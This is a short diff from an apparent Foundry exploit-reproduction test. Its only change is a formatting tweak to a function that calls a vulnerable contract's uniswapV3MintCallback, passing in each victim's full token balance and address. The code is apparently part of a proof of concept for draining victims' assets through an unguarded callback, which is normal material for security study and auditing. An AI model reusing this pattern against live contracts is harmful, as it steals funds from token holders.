@@ -239,7 +239,9 @@ contract ContractTest is Test {
         require(success);
     }
 
-    function uniswapV3MintCallback(uint256 num) internal {
+    function uniswapV3MintCallback(
+        uint256 num
+    ) internal {
         VulnerableContract.uniswapV3MintCallback(
             0, victimsAssets[num].balanceOf(victims[num]), abi.encode(victims[num])
         );
